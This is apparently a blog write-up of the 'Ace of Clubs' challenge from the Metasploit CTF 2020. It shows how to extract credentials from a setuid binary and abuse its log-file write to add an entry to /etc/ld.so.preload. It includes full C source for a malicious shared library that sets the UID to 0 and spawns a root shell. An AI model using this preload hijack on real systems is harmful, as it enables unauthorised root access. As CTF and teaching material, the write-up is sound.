---
layout: post
title:  "Metasploit CTF December 2020"
---

# Metasploit CTF December 2020

Over the last weekend I had a little time to participate in the Metasploit CTF 2020, and one particular challenge I found quite interesting mainly becuase the route I decided to take was probably a little different and a lot more involved but I wanted to test myself! So let's crack on...

## Challenge: Ace of Clubs

The challenge begins with an SSH server listening on port 9009, after connecting you're presented with a banner requesting you to login as admin, with a few simple guesses the password is 'password' and we get a shell with user or low privileges.

![alt text](https://ben0.github.io/msf-ctf-2020/9009_sshlogin.PNG "SSH port 9009")

After some enumeration we find the flag in /etc/ace_of_spades.jpg readable as root, and a binary /opt/vpn_connect with set user ID on execution, and the owner root - this must be the path to flag.

First lets see if the binary has any dependencies, using ldd we can see what shared objects are required by the binary, and this particular binary requires the library /usr/lib/libvpnauthcustom.so to run.

![alt text](https://ben0.github.io/msf-ctf-2020/9009_ldd.PNG "Library dependencies")

Using NM we can list the symbols in the files, grepping for T or t, symbols in the data section.

![alt text](https://ben0.github.io/msf-ctf-2020/9009_nm.PNG "Binary symbols")

Running the binary we're prompted with usage instructions, the binary requires a user, password, and a log path. Let see if we can get the username & password using GDB, I use pwndbg which is pretty great for any sort of reverse engineering, I highly recommened it. We can set the binary arguments, and set execute to break when it hits the authenticate function:

![alt text](https://ben0.github.io/msf-ctf-2020/9009_gdbstart.PNG "GDB")

Now we can step a few instructions, to the call to string compare where our user supplied input is being compared to the string 'username' - this must be the username!  Repeating this process we also get the password.

![alt text](https://ben0.github.io/msf-ctf-2020/9009_gdbusername.PNG "GDB")
![alt text](https://ben0.github.io/msf-ctf-2020/9009_gdbpassword.PNG "GDB")

Excellent, now we know the username and password surely we'll get the flag, let's run the binary with the correct username and password.... Fail, nothing happens. To save time let us see what we get with strace, a great utility to trace system calls.

![alt text](https://ben0.github.io/msf-ctf-2020/9009_strace.PNG "System trace")

The notable system calls here are `umask` which sets the file creation mask, then `openat` to get a file descriptor with the flags `O_WRONLY | O_CREAT`, write only or create if the file doesn't exist, then we see a few `write` calls with logging information followed by a `close` on the file descriptor.

As the binary is running as root we effectively have an arbitrary write to any file with the username and password which we control as well as the other junk, great! Here I tried to write to `/etc/passwd` or `/etc/shadow` but I couldn't get the format correct and I decided to get a root shell instead :-)

### Privilege escalation

The binary uses a shared library to provide the `authenticate` function which is dynamically loaded at run-time. The shared library is located in `/usr/lib/libvpnauthcustom.so` and we only have read permissions, how can we abuse this?

Linux provides functionality for preloading libraries through `LD_PRELOAD` and `/etc/ld.so.preload`, preloading allows a user to suppler a library which is loaded before other libraries. If we create and compile a library with a function named `authenticate` can we hijack the execution of the binary?

Here is rough (don't judge me!) sourcecode with a single function `authenticate` when called by the binary set the UID to 0 and calls system with `/bin/bash` giving us a root shell!  

```
cat > /tmp/exploit.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int authenticate(const char *str,const char *str1) {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    printf("Uid: %i, Euid: %i\n",uid,euid);

    setuid(0);
    setgid(0);
    
    uid_t puid = getuid();
    uid_t peuid = geteuid();
    printf("Uid: %i, Euid: %i\n",puid,peuid);

    system("/bin/bash");
    return 0;
}
EOF
```
Compile the source code into a shared object:

![alt text](https://ben0.github.io/msf-ctf-2020/9009_payload_compile.PNG "Compiling exploit.c")

Then we can abuse the log functionalilty to write the string '/tmp/preload.so' to `/etc/ld.so.preload`:

![alt text](https://ben0.github.io/msf-ctf-2020/9009_write_ld_so_payload1.PNG "Abusing the -l switch")

If you look at the last image, you can see the errors produced by `ld.so` which is responsible for finding and loading shared libraries. Any shared libraries can be specificed seperated by white spaces so it's a fairly relaxed syntax, there are plenty of errors where `ld.so` can't find the library specificed but it still finds our malicious shared library and is preloaded when a binary in run. 

We've created and compiled a shared object library, abused the vpn_connect binary to add our library to `ld.so.preload`, running the binary now we get a shell as root!

![alt text](https://ben0.github.io/msf-ctf-2020/9009_exploit1.PNG "Exploit!")
![alt text](https://ben0.github.io/msf-ctf-2020/9009_exploit2.PNG "Exploit!")

### Next steps

The shared object isn't perfect, but we could improve it by removing some of the printf statements and deleting `/etc/ld.so.preload` to stop those nagging error messages:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int authenticate(const char *str,const char *str1) {
    setuid(0);
    setgid(0);
    unlink("/etc/ld.so.preload");
    system("/bin/bash");
    return 0;
}
```
